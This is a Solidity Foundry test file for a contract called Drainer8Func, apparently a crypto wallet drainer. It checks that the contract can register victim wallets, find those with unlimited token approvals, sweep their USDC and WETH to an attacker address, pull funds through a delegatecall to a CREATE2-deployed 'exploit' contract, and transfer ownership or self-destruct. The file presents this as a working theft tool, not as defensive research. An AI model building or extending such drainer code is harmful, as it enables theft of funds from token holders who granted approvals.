// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Drainer8Func.sol";

contract ERC20Mock {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt; return true;
    }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(allowance[from][msg.sender] >= amt, "insufficient allowance");
        require(balanceOf[from] >= amt, "insufficient balance");
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Drainer8FuncTest is Test {
    Drainer8Func drain;
    ERC20Mock usdc;
    ERC20Mock weth;
    
    address owner = address(0x100);
    address atk = address(0x200);
    address v1 = address(0x301);
    address v2 = address(0x302);
    address v3 = address(0x303);
    
    function setUp() public {
        vm.prank(owner);
        drain = new Drainer8Func();
        usdc = new ERC20Mock();
        weth = new ERC20Mock();
        
        usdc.mint(v1, 1000e6);
        usdc.mint(v2, 500e6);
        usdc.mint(v3, 100e6);
        weth.mint(v1, 3e18);
        weth.mint(v2, 1e18);
    }
    
    function test_All8Functions() public {
        // === 1. setup ===
        address[] memory tokens = new address[](2);
        tokens[0] = address(usdc); tokens[1] = address(weth);
        vm.prank(owner); drain.setup(tokens);
        
        // === 2. register ===
        address[] memory victims = new address[](3);
        victims[0] = v1; victims[1] = v2; victims[2] = v3;
        vm.prank(owner); drain.register(victims);
        
        // === Victims approve ===
        vm.prank(v1); usdc.approve(address(drain), type(uint256).max);
        vm.prank(v2); usdc.approve(address(drain), type(uint256).max);
        vm.prank(v1); weth.approve(address(drain), type(uint256).max);
        
        // === 3. all ===
        (address[] memory vArr, address[] memory tArr, uint vCount, uint tCount) = drain.all();
        assertEq(vCount, 3, "should have 3 victims");
        assertEq(tCount, 2, "should have 2 tokens");
        
        // === 4. inspect ===
        (address[] memory list, uint[] memory amounts, uint total) = drain.inspect(address(usdc));
        assertEq(list.length, 2, "should find 2 approved wallets");
        emit log_named_uint("Drainable USDC wallets", list.length);
        emit log_named_uint("Total drainable USDC", total);
        
        // === 5. sweep ===
        vm.prank(owner);
        uint swept = drain.sweep(address(usdc), atk);
        assertEq(swept, 1500e6, "should sweep 1500 USDC");
        assertEq(usdc.balanceOf(atk), 1500e6, "attacker got USDC");
        assertEq(usdc.balanceOf(v1), 0, "v1 drained");
        assertEq(usdc.balanceOf(v2), 0, "v2 drained");
        
        // === 6. control (pause/unpause) ===
        vm.prank(owner); drain.control(2, address(0)); // pause
        assertTrue(drain.paused());
        vm.prank(owner); drain.control(3, address(0)); // unpause
        assertFalse(drain.paused());
        
        // === 7. forward (DELEGATECALL) ===
        address[] memory targets = new address[](1);
        targets[0] = v1;
        address[] memory wethOnly = new address[](1);
        wethOnly[0] = address(weth);
        
        vm.prank(owner);
        address exploit = drain.destroy(bytes32(uint(1)), atk);
        
        vm.prank(owner);
        drain.forward(
            exploit,
            abi.encodeWithSignature("pull(address,address[],address)", address(weth), targets, atk)
        );
        
        assertEq(weth.balanceOf(v1), 0, "v1 WETH drained via forward");
        assertEq(weth.balanceOf(atk), 3e18, "attacker got WETH via forward");
        
        // === 8. destroy (CREATE2) ===
        vm.prank(owner);
        address exploit2 = drain.destroy(bytes32(uint(2)), owner);
        uint codeLen;
        assembly { codeLen := extcodesize(exploit2) }
        assertGt(codeLen, 0, "exploit2 deployed via CREATE2");
        
        // control: transfer ownership
        vm.prank(owner); drain.control(1, atk);
        assertEq(drain.owner(), atk, "ownership transferred");
        
        // control: kill
        vm.prank(atk); drain.control(4, address(0));
        
        emit log("");
        emit log("========= 8 FUNCTIONS TESTED =========");
        emit log("1. setup     PASS");
        emit log("2. register  PASS");
        emit log("3. all       PASS");
        emit log("4. inspect   PASS");
        emit log("5. sweep     PASS");
        emit log("6. control   PASS");
        emit log("7. forward   PASS");
        emit log("8. destroy   PASS");
        emit log("=======================================");
    }
}
